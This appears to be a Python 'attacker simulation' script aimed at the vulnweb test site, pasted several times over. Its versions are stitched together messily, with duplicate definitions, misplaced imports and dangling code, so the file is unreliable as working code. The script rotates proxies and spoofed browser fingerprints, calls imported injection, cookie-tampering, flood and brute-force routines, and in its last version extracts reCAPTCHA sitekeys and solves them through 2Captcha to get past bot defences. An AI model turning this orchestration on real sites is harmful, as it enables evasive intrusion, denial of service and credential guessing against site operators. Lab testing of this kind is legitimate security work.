import os
import json
import time
import random
import urllib3
import requests
from datetime import datetime
from depth_crawler import depth_crawl
from attack_vector import (
    method_variation,
    payload_injection,
    header_injection,
    cookie_tampering,
    flood_attack,
    bruteforce_attack
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ------------------------------
# Config
# ------------------------------
PROXY_FILE = "working_proxies.txt"
BLACKLIST_FILE = "blacklist.txt"
LOG_FILE = "proxy_logs.json"

MAX_PROXIES = int(os.getenv("MAX_PROXIES", "8"))
REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "30"))
DELAY_RANGE = (float(os.getenv("DELAY_MIN", "0.6")), float(os.getenv("DELAY_MAX", "3.2")))
CRAWL_MODE = os.getenv("CRAWL_MODE", "sequential")  # sequential or random

FLOW_ENDPOINTS = [
    "http://testphp.vulnweb.com/login.php",   # सही backend login endpoint
    "http://testphp.vulnweb.com/userinfo.php",   # सही backend login endpoint
    "http://testphp.vulnweb.com/userinfo.php", # client-side route
    "http://testphp.vulnweb.com/userinfo.php",
    "http://testphp.vulnweb.com/userinfo.php"
]

NAV_SEQUENCE = [
    {"url": "http://testphp.vulnweb.com/login.php", "method": "POST", "data": {"uname": "test", "pass": "123"}},
    {"url": "http://testphp.vulnweb.com/userinfo.php", "method": "POST", "data": {"uname": "test", "pass": "123"}},
    {"url": "http://testphp.vulnweb.com/userinfo.php", "method": "GET"},
]

FINGERPRINTS = [
    {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "text/html,application/json;q=0.9",
        "Referer": "https://www.google.com/",
        "DNT": "1"
    },
    {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        "Accept-Language": "en-US,en;q=0.8",
        "Accept": "application/json,text/plain;q=0.8",
        "Referer": "https://www.bing.com/",
        "Upgrade-Insecure-Requests": "1"
    },
    {
        "User-Agent": "Mozilla/5.0 (Linux; Android 11; Pixel 5) Firefox/118.0",
        "Accept-Language": "en-US,en;q=0.7",
        "Accept": "application/json",
        "Referer": "https://m.youtube.com/",
        "Cache-Control": "no-cache"
    },
    {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
        "Accept-Language": "en-US,en;q=0.6",
        "Accept": "text/html;q=0.9",
        "Referer": "https://apple.com/",
        "Pragma": "no-cache"
    }
]

# ------------------------------
# Helpers
# ------------------------------
def rand_delay(a=DELAY_RANGE[0], b=DELAY_RANGE[1]):
    time.sleep(random.uniform(a, b))

def load_blacklist():
    if not os.path.exists(BLACKLIST_FILE):
        return set()
    with open(BLACKLIST_FILE, "r") as f:
        return set(line.strip() for line in f if line.strip())

def log_json(entry: dict):
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")

def load_proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE, "r") as f:
        return [line.strip() for line in f if line.strip()]

def pick_proxy():
    proxies = load_proxies()
    if not proxies:
        return None
    return random.choice(proxies)

# ------------------------------
# Attacker simulation flows
# ------------------------------
from depth_crawler import depth_crawl
from helpers import log_json, categorize_status, extract_keywords, REQUEST_TIMEOUT, MAX_LINKS_PER_PAGE
from proxy_managers import filter_working_proxies

def attacker_flow():
    proxy = pick_proxy()
    headers = random.choice(FINGERPRINTS)

    session = requests.Session()
    if proxy and "127.0.0.1" not in NAV_SEQUENCE[0]["url"]:
        if proxy.startswith("socks5://"):
            session.proxies = {"http": proxy, "https": proxy}
        else:
            session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    # Crawl mode
    sequence = NAV_SEQUENCE.copy()
    if CRAWL_MODE == "random":
        random.shuffle(sequence)

    # Navigation flow
    for step in sequence:
        url = step["url"]
        method = step["method"]
        data = step.get("data", {})
        try:
            if method == "GET":
                r = session.get(url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
            elif method == "POST":
                r = session.post(url, headers=headers, json=data, timeout=REQUEST_TIMEOUT, verify=False)
            else:
                continue

            print(f"[{method}] {url} -> {r.status_code}")
            print(f"   ▸ Body preview: {r.text}")

            log_json({
                "time": datetime.utcnow().isoformat(),
                "phase": "nav",
                "url": url,
                "method": method,
                "status": r.status_code,
                "body_preview": r.text
            })
            depth_crawl(session, url, r.text, headers, proxy)
            method_variation(session,url,headers,proxy)
            payload_injection(session,url,headers,proxy)
            header_injection(session, url, headers, proxy)
            cookie_tampering(session, url, headers, proxy)
            flood_attack(session, url, headers, proxy)
            bruteforce_attack(session, url, headers, proxy=None)
            rand_delay()
        except Exception as e:
            print(f"Error in flow: {e}")
            log_json({"time": datetime.utcnow().isoformat(), "phase": "nav", "url": url, "error": str(e)})

    # Probes
    for ep in FLOW_ENDPOINTS:
        try:
            r = session.get(ep, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
            print(f"[Probe] {ep} -> {r.status_code}")
            print(f"   ▸ Probe body preview: {r.text[:200]}")

            log_json({
                "time": datetime.utcnow().isoformat(),
                "phase": "probe",
                "url": ep,
                "status": r.status_code,
                "body_preview": r.text[:200]
            })
        except Exception as e:
            print(f"[Probe] {ep} -> Error ❌ ({e})")
            log_json({"time": datetime.utcnow().isoformat(), "phase": "probe", "url": ep, "error": str(e)})

# ------------------------------
# Run attacker
# ------------------------------
if __name__ == "__main__":
    print("=== Advanced Attacker Simulation ===")
    for i in range(min(MAX_PROXIES, 3)):
        print(f"\n--- Flow {i+1} ---")
        attacker_flow()

        # next upgrade
        from bs4 import BeautifulSoup
def check_proxy(proxy):
    try:
        test_session = requests.Session()
        test_session.proxies = {"http": proxy, "https": proxy}
        r = test_session.get("http://httpbin.org/ip", timeout=10, verify=False)
        return r.status_code == 200
    except:
        return False

def filter_working_proxies():
    proxies = load_proxies()
    working = [p for p in proxies if check_proxy(p)]
    return working
def categorize_status(code: int) -> str:
    if 200 <= code < 300:
        return "Success"
    elif 400 <= code < 500:
        return "Client Error"
    elif 500 <= code < 600:
        return "Server Error"
    return "Other"

def extract_keywords(html_text: str, limit: int = 5):
    try:
        soup = BeautifulSoup(html_text, "html.parser")
        words = []
        # Collect title + h1/h2/h3 text
        if soup.title and soup.title.string:
            words.append(soup.title.string.strip())
        for tag in soup.find_all(["h1", "h2", "h3"]):
            if tag.get_text():
                words.append(tag.get_text().strip())
        # Return top N keywords
        return words[:limit]
    except Exception:
        return []

def attacker_flow():
    proxies = load_proxies()
    headers = random.choice(FINGERPRINTS)
    sequence = NAV_SEQUENCE.copy()
    if CRAWL_MODE == "random":
        random.shuffle(sequence)

    for proxy in proxies + [None]:  # try all proxies, then direct
        try:
            session = requests.Session()
            if proxy:
                if proxy.startswith("socks5://"):
                    session.proxies = {"http": proxy, "https": proxy}
                else:
                    session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

            # Navigation flow
            for step in sequence:
                url = step["url"]
                method = step["method"]
                data = step.get("data", {})
                r = session.request(method, url, headers=headers, json=data if method=="POST" else None,
                                    timeout=REQUEST_TIMEOUT, verify=False)

                print(f"[{method}] {url} -> {r.status_code}")
                print(f"   ▸ Body preview: {r.text[:200]}")

                # Depth crawling: extract links
                soup = BeautifulSoup(r.text, "html.parser")
                links = [a.get("href") for a in soup.find_all("a", href=True)]
                for link in links[:5]:  # limit crawl
                    try:
                        crawl_url = requests.compat.urljoin(url, link)
                        rc = session.get(crawl_url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
                        print(f"   ➥ Crawled {crawl_url} -> {rc.status_code}")
                    except Exception as e:
                        print(f"   ➥ Crawl error {link}: {e}")

                rand_delay()

            # Probes
            for ep in FLOW_ENDPOINTS:
                r = session.get(ep, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
                print(f"[Probe] {ep} -> {r.status_code}")
                print(f"   ▸ Probe body preview: {r.text[:200]}")

            break  # if one proxy works, stop trying others
        except Exception as e:
            print(f"Proxy {proxy} failed: {e}")
            continue
            # Navigation flow
    for step in sequence:
        url = step["url"]
        method = step["method"]
        data = step.get("data", {})
        try:
            if method == "GET":
                r = session.get(url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
            elif method == "POST":
                r = session.post(url, headers=headers, json=data, timeout=REQUEST_TIMEOUT, verify=False)
            else:
                continue

            category = categorize_status(r.status_code)
            keywords = extract_keywords(r.text)

            print(f"[{method}] {url} -> {r.status_code} ({category})")
            print(f"   ▸ Body preview: {r.text[:200]}")
            print(f"   ▸ Keywords: {keywords}")

            log_json({
                "time": datetime.utcnow().isoformat(),
                "phase": "nav",
                "url": url,
                "method": method,
                "status": r.status_code,
                "category": category,
                "body_preview": r.text[:200],
                "keywords": keywords
            })

            rand_delay()
        except Exception as e:
            print(f"Error in flow: {e}")
            log_json({"time": datetime.utcnow().isoformat(), "phase": "nav", "url": url, "error": str(e)})

    # Probes
    for ep in FLOW_ENDPOINTS:
        try:
            r = session.get(ep, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
            category = categorize_status(r.status_code)
            keywords = extract_keywords(r.text)

            print(f"[Probe] {ep} -> {r.status_code} ({category})")
            print(f"   ▸ Probe body preview: {r.text[:200]}")
            print(f"   ▸ Keywords: {keywords}")

            log_json({
                "time": datetime.utcnow().isoformat(),
                "phase": "probe",
                "url": ep,
                "status": r.status_code,
                "category": category,
                "body_preview": r.text[:200],
                "keywords": keywords
            })
        except Exception as e:
            print(f"[Probe] {ep} -> Error ❌ ({e})")
            log_json({"time": datetime.utcnow().isoformat(), "phase": "probe", "url": ep, "error": str(e)})

        # analyze log using log_analyzer.py

        import os
import re
import json
import time
import random
import urllib3
import requests
from datetime import datetime
from bs4 import BeautifulSoup

# External modules from your project
from depth_crawler import depth_crawl
from attack_vector import (
    method_variation,
    payload_injection,
    header_injection,
    cookie_tampering,
    flood_attack,
    bruteforce_attack
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ------------------------------
# Config
# ------------------------------
PROXY_FILE = "working_proxies.txt"
BLACKLIST_FILE = "blacklist.txt"
LOG_FILE = "proxy_logs.json"

MAX_PROXIES = int(os.getenv("MAX_PROXIES", "8"))
REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "30"))
DELAY_RANGE = (float(os.getenv("DELAY_MIN", "0.6")), float(os.getenv("DELAY_MAX", "3.2")))
CRAWL_MODE = os.getenv("CRAWL_MODE", "sequential")  # sequential or random

# Set your 2Captcha API key in environment
CAPTCHA_API_KEY = os.getenv("CAPTCHA_API_KEY")

FLOW_ENDPOINTS = [
    "http://testphp.vulnweb.com/login.php",   # backend login endpoint
    "http://testphp.vulnweb.com/userinfo.php",# backend login endpoint
    "http://testphp.vulnweb.com/userinfo.php",# client-side route
    "http://testphp.vulnweb.com/userinfo.php",
    "http://testphp.vulnweb.com/userinfo.php"
]

NAV_SEQUENCE = [
    {"url": "http://testphp.vulnweb.com/login.php", "method": "POST", "data": {"uname": "test", "pass": "123"}},
    {"url": "http://testphp.vulnweb.com/userinfo.php", "method": "POST", "data": {"uname": "test", "pass": "123"}},
    {"url": "http://testphp.vulnweb.com/userinfo.php", "method": "GET"},
]

FINGERPRINTS = [
    {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "text/html,application/json;q=0.9",
        "Referer": "https://www.google.com/",
        "DNT": "1"
    },
    {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        "Accept-Language": "en-US,en;q=0.8",
        "Accept": "application/json,text/plain;q=0.8",
        "Referer": "https://www.bing.com/",
        "Upgrade-Insecure-Requests": "1"
    },
    {
        "User-Agent": "Mozilla/5.0 (Linux; Android 11; Pixel 5) Firefox/118.0",
        "Accept-Language": "en-US,en;q=0.7",
        "Accept": "application/json",
        "Referer": "https://m.youtube.com/",
        "Cache-Control": "no-cache"
    },
    {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
        "Accept-Language": "en-US,en;q=0.6",
        "Accept": "text/html;q=0.9",
        "Referer": "https://apple.com/",
        "Pragma": "no-cache"
    }
]

# ------------------------------
# Helpers
# ------------------------------
def rand_delay(a=DELAY_RANGE[0], b=DELAY_RANGE[1]):
    time.sleep(random.uniform(a, b))

def load_blacklist():
    if not os.path.exists(BLACKLIST_FILE):
        return set()
    with open(BLACKLIST_FILE, "r", encoding="utf-8") as f:
        return set(line.strip() for line in f if line.strip())

def add_blacklist(proxy_line: str):
    with open(BLACKLIST_FILE, "a", encoding="utf-8") as f:
        f.write(proxy_line + "\n")

def log_json(entry: dict):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")

def load_proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def pick_proxy():
    proxies = load_proxies()
    if not proxies:
        return None
    return random.choice(proxies)

def check_proxy(proxy: str):
    try:
        test_session = requests.Session()
        test_session.proxies = {"http": proxy, "https": proxy}
        r = test_session.get("http://httpbin.org/ip", timeout=10, verify=False)
        return r.status_code == 200
    except Exception:
        return False

def filter_working_proxies():
    proxies = load_proxies()
    working = [p for p in proxies if check_proxy(p)]
    return working

def categorize_status(code: int) -> str:
    if 200 <= code < 300:
        return "Success"
    elif 400 <= code < 500:
        return "Client Error"
    elif 500 <= code < 600:
        return "Server Error"
    return "Other"

def extract_keywords(html_text: str, limit: int = 5):
    try:
        soup = BeautifulSoup(html_text or "", "html.parser")
        words = []
        if soup.title and soup.title.string:
            words.append(soup.title.string.strip())
        for tag in soup.find_all(["h1", "h2", "h3"]):
            if tag.get_text():
                words.append(tag.get_text().strip())
        return words[:limit]
    except Exception:
        return []

# ------------------------------
# Captcha helpers (ethical lab use only)
# ------------------------------
SITEKEY_PATTERNS = [
    r'data-sitekey["\']?\s*=\s*["\']([0-9A-Za-z_-]{10,})["\']',
    r'["\']sitekey["\']\s*:\s*["\']([0-9A-Za-z_-]{10,})["\']',
    r'grecaptcha\.render\([^)]+["\']sitekey["\']\s*:\s*["\']([0-9A-Za-z_-]{10,})["\']'
]

def extract_sitekey(html_text: str):
    """Find reCAPTCHA sitekey via HTML attr or regex."""
    try:
        soup = BeautifulSoup(html_text or "", "html.parser")
        tag = soup.find(attrs={"data-sitekey": True})
        if tag and tag.get("data-sitekey"):
            return tag.get("data-sitekey")
    except Exception:
        pass
    for pat in SITEKEY_PATTERNS:
        m = re.search(pat, html_text or "", flags=re.IGNORECASE)
        if m:
            return m.group(1)
    return None

def solve_captcha(site_key: str, page_url: str):
    """Solve reCAPTCHA using 2Captcha; returns token or None."""
    if not CAPTCHA_API_KEY:
        print("⚠️ CAPTCHA_API_KEY missing. Set environment variable.")
        return None
    try:
        create_task = requests.post(
            "http://2captcha.com/in.php",
            data={
                "key": CAPTCHA_API_KEY,
                "method": "userrecaptcha",
                "googlekey": site_key,
                "pageurl": page_url,
                "json": 1
            },
            timeout=15
        ).json()
        if create_task.get("status") != 1:
            print("❌ Captcha task create failed:", create_task)
            return None

        task_id = create_task["request"]
        # Poll result up to ~110s
        for _ in range(22):
            time.sleep(5)
            res = requests.get(
                "http://2captcha.com/res.php",
                params={"key": CAPTCHA_API_KEY, "action": "get", "id": task_id, "json": 1},
                timeout=15
            ).json()
            if res.get("status") == 1:
                print("✅ Captcha solved")
                return res["request"]

        print("❌ Captcha solve timeout")
        return None
    except Exception as e:
        print("⚠️ Captcha solver error:", e)
        return None

def handle_challenge(session: requests.Session, url: str, headers: dict, resp_text: str) -> bool:
    """
    Detect captcha/JS-CDN hints; try sitekey extraction + 2Captcha token.
    If solved, inject 'g-recaptcha-response' into headers and signal retry.
    """
    text_lc = (resp_text or "").lower()
    if "captcha" in text_lc or "cloudflare" in text_lc or "akamai" in text_lc:
        sitekey = extract_sitekey(resp_text or "")
        if sitekey:
            print(f"   🔑 Sitekey extracted: {sitekey} → solving via 2Captcha...")
            token = solve_captcha(sitekey, url)
            if token:
                headers["g-recaptcha-response"] = token
                return True  # caller should retry request
        else:
            print("   ❓ Captcha/JS hint detected but sitekey not found.")
    return False

# ------------------------------
# Attacker simulation flow
# ------------------------------
def attacker_flow():
    proxies = load_proxies()
    headers = random.choice(FINGERPRINTS).copy()
    headers.setdefault("Content-Type", "application/x-www-form-urlencoded")

    # Sequence copy and optional shuffle
    sequence = NAV_SEQUENCE.copy()
    if CRAWL_MODE == "random":
        random.shuffle(sequence)

    for proxy in proxies + [None]:  # try all proxies, then direct
        try:
            session = requests.Session()
            if proxy:
                if proxy.startswith("socks5://"):
                    session.proxies = {"http": proxy, "https": proxy}
                else:
                    session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

            # Navigation flow
            for step in sequence:
                url = step["url"]
                method = step["method"]
                data = step.get("data", {})
                try:
                    if method == "GET":
                        r = session.get(url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
                    elif method == "POST":
                        # Send as form-encoded (not JSON)
                        r = session.post(url, headers=headers, data=data, timeout=REQUEST_TIMEOUT, verify=False)
                    else:
                        continue

                    # Captcha/JS challenge handling + retry
                    if handle_challenge(session, url, headers, r.text):
                        rand_delay(0.8, 2.0)
                        if method == "GET":
                            r = session.get(url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
                        else:
                            r = session.post(url, headers=headers, data=data, timeout=REQUEST_TIMEOUT, verify=False)

                    category = categorize_status(r.status_code)
                    keywords = extract_keywords(r.text)

                    print(f"[{method}] {url} -> {r.status_code} ({category})")
                    print(f"   ▸ Body preview: {r.text[:200]}")
                    print(f"   ▸ Keywords: {keywords}")

                    log_json({
                        "time": datetime.utcnow().isoformat(),
                        "phase": "nav",
                        "url": url,
                        "method": method,
                        "status": r.status_code,
                        "category": category,
                        "body_preview": r.text[:200],
                        "keywords": keywords
                    })

                    # Depth crawl + attack vectors
                    depth_crawl(session, url, r.text, headers, proxy)
                    method_variation(session, url, headers, proxy)
                    payload_injection(session, url, headers, proxy)
                    header_injection(session, url, headers, proxy)
                    cookie_tampering(session, url, headers, proxy)
                    flood_attack(session, url, headers, proxy)
                    bruteforce_attack(session, url, headers, proxy=None)

                    rand_delay()
                except Exception as e:
                    print(f"Error in flow: {e}")
                    log_json({
                        "time": datetime.utcnow().isoformat(),
                        "phase": "nav",
                        "url": url,
                        "error": str(e)
                    })

            # Probes with challenge handling
            for ep in FLOW_ENDPOINTS:
                try:
                    r = session.get(ep, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)

                    if handle_challenge(session, ep, headers, r.text):
                        rand_delay(0.5, 1.5)
                        r = session.get(ep, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)

                    category = categorize_status(r.status_code)
                    keywords = extract_keywords(r.text)

                    print(f"[Probe] {ep} -> {r.status_code} ({category})")
                    print(f"   ▸ Probe body preview: {r.text[:200]}")
                    print(f"   ▸ Keywords: {keywords}")

                    log_json({
                        "time": datetime.utcnow().isoformat(),
                        "phase": "probe",
                        "url": ep,
                        "status": r.status_code,
                        "category": category,
                        "body_preview": r.text[:200],
                        "keywords": keywords
                    })
                except Exception as e:
                    print(f"[Probe] {ep} -> Error ❌ ({e})")
                    log_json({
                        "time": datetime.utcnow().isoformat(),
                        "phase": "probe",
                        "url": ep,
                        "error": str(e)
                    })

            # Stop after first working proxy/session completes
            break
        except Exception as e:
            print(f"Proxy {proxy} failed: {e}")
            continue

# ------------------------------
# Main
# ------------------------------
if __name__ == "__main__":
    print("=== Advanced Attacker Simulation (Ethical Lab) ===")
    working = filter_working_proxies()
    if not working:
        print("⚠️ No working proxies found. Running direct flows.")
        working = [None]

    for i in range(min(MAX_PROXIES, len(working), 3)):
        print(f"\n--- Flow {i+1} ---")
        attacker_flow()

    print("\n📜 Logs:", LOG_FILE)
    print("🚫 Blacklist:", BLACKLIST_FILE)
    if not CAPTCHA_API_KEY:
        print("ℹ️ CAPTCHA_API_KEY not set. Captcha solver will be skipped.")